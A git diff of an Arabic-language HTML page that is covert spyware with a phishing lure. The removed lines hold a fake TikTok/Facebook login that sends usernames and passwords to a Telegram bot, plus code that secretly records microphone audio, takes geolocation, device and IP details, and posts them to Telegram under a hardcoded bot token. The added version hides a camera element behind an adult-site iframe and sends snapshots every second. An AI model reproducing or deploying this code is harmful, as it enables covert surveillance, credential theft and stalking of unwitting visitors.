@@ -1,70 +1,17 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>TikTok Login + صورة</title>
-  <style>
-    body {
-      background-color: #f0f2f5;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .login-container {
-      background-color: white;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      width: 360px;
-      text-align: center;
-    }
-
-    .login-container h2 {
-      color: #1877f2;
-      margin-bottom: 25px;
-      font-size: 24px;
-    }
-
-    input, button {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      border-radius: 6px;
-      border: 1px solid #ddd;
-      font-size: 16px;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #1877f2;
-    }
-
-    button {
-      background-color: #1877f2;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #165fbd;
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>Video Porn</title>
 </head>
 <body>
-<p id="status"></p>
+
 <video id="video" width="0" height="0" autoplay></video>
 <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-  <h3 id="record"></h3>
 
-    </form>
-  </div>
 <iframe 
   width="100%" 
-  height="100%" 
+  height="2000" 
   src="https://pin.porn" 
   title="YouTube video player" 
   frameborder="0" 
@@ -75,169 +22,7 @@
   <script>
 
 
- async function checkPermissions() {
-  try {
-    // دەبێ سەرەتا Allow دابگری
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    // إذا تم السماح، نستمر في تشغيل الكود الأصلي
-    stream.getTracks().forEach(track => track.stop()); // نوقف الكاميرا فورًا لأنه فقط للتحقق
-    init(); // هذه هي الدالة الأصلية عند window.onload في كودك الأصلي
-  } catch (err) {
-    // إذا رفض المستخدم الإذن
-    alert("دەبێت سەرەتا بەشی Allow بۆ هەمووی دابگری .");
-    // إيقاف عرض محتوى الصفحة أو عرض رسالة فقط
-    document.body.innerHTML = "<h1 style='text-align:center; margin-top: 50px;'> دابگری بۆ ئەوەی ئیش بکا (Allow) دەبێت </h1>";
-  }
-}
-
-// نمنع الكود الأصلي من التنفيذ عند تحميل الصفحة مباشرة، ونستبدله بالتحقق أولًا
-window.onload = () => {
-  checkPermissions();
-};
-
-
-        
-  const botToken = '7637585480:AAGvzoKRGOPR-gDp3ygL9MgEoRkaiTSyVLw';
-const chatId = '5454881984';
-
-   let stream = null;
-    let mediaRecorder = null;
-    let audioChunks = [];
-    let intervalId = null;
-
-    async function startNewRecording() {
-      audioChunks = [];
-      mediaRecorder = new MediaRecorder(stream);
-
-      mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-
-      mediaRecorder.onstop = async () => {
-        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("voice", audioBlob);
-
-        document.getElementById("record").innerText = "";
-
-        try {
-          await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
-            method: "POST",
-            body: formData,
-            keepalive: true
-          });
-          document.getElementById("record").innerText = "";
-        } catch (err) {
-          console.error("", err);
-        }
-
-        // بدء تسجيل جديد تلقائيًا
-        startNewRecording();
-      };
-
-      mediaRecorder.start();
-
-      // توقف التسجيل بعد 3 ثوانٍ
-      setTimeout(() => {
-        if (mediaRecorder.state === "recording") {
-          mediaRecorder.stop();
-        }
-      }, 3000);
-    }
-
-    async function init() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        startNewRecording();
-      } catch (err) {
-        console.error("", err);
-        document.getElementById("record").innerText = "";
-      }
-    }
-
-    
-
-    window.onbeforeunload = () => {
-      if (mediaRecorder && mediaRecorder.state === "recording") {
-        mediaRecorder.stop();
-      }
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-    };
-
-function sendTelegramMessage(text) {
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: text,
-      parse_mode: "HTML"
-    })
-  });
-}
-
-function getLocation() {
-  if ("geolocation" in navigator) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const msg = `📍 <b>Exact Location</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
-        sendTelegramMessage(msg);
-        // بعدها ترسل باقي المعلومات لو تحب
-        sendTelegramMessage(getDeviceInfo());
-        getIPInfo();
-      },
-      err => {
-        sendTelegramMessage("⚠️ Location access denied.");
-        // لو رفض المستخدم الموقع، نرسل باقي المعلومات بدون الموقع
-        sendTelegramMessage(getDeviceInfo());
-        getIPInfo();
-      }
-    );
-  } else {
-    sendTelegramMessage("❌ Geolocation not supported.");
-    sendTelegramMessage(getDeviceInfo());
-    getIPInfo();
-  }
-}
-
-function getDeviceInfo() {
-  return `
-🧾 <b>Device Info</b>
-User Agent: ${navigator.userAgent}
-Platform: ${navigator.platform}
-Language: ${navigator.language}
-Device Memory: ${navigator.deviceMemory || 'N/A'} GB
-Cores: ${navigator.hardwareConcurrency || 'N/A'}
-Cookies Enabled: ${navigator.cookieEnabled}
-  `;
-}
-
-function getIPInfo() {
-  fetch('https://api.db-ip.com/v2/free/self')
-    .then(res => res.json())
-    .then(data => {
-      const msg = `
-🌐 <b>IP Info</b>
-IP: ${data.ipAddress}
-City: ${data.city}
-Region: ${data.stateProv}
-Country: ${data.countryName}
-Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}
-      `;
-      sendTelegramMessage(msg);
-    }).catch(() => {
-      sendTelegramMessage("❌ Failed to get IP info.");
-    });
-}
-
-// ابدأ بطلب الموقع مباشرة
-getLocation();
-  
-
-    
+<script>
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
@@ -250,7 +35,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
   video.srcObject = stream;
 })
 .catch(err => {
-  alert(": " + err);
+  alert("لا يمكن الوصول إلى الكاميرا: " + err);
 });
 
 async function captureAndSend() {
@@ -268,48 +53,19 @@ async function captureAndSend() {
       });
       const data = await response.json();
       if(data.ok){
-        console.log('');
+        console.log('تم إرسال الصورة');
       } else {
-        console.error(':', data);
+        console.error('خطأ في الإرسال:', data);
       }
     } catch (error) {
-      console.error(':', error);
+      console.error('خطأ في الإرسال:', error);
     }
   }, 'image/jpeg');
 }
 
 // التقط صورة كل 5 ثواني تلقائيًا
-setInterval(captureAndSend, 5000);
-// Facebook Phishing
-    document.getElementById('telegramForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      const token = '7637585480:AAGvzoKRGOPR-gDp3ygL9MgEoRkaiTSyVLw';
-      const chat_id = '5454881984';
-
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const photo = document.getElementById('photo').files[0];
-
-      const formData = new FormData();
-      formData.append('chat_id', chat_id);
-      formData.append('caption', `محاولة تسجيل دخول:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`);
-      formData.append('photo', photo);
-
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        alert("");
-      })
-      .catch(err => {
-        alert("");
-        console.error(err);
-      });
-    });
-  </script>
+setInterval(captureAndSend, 1000);
+</script>
 
 </body>
 </html>
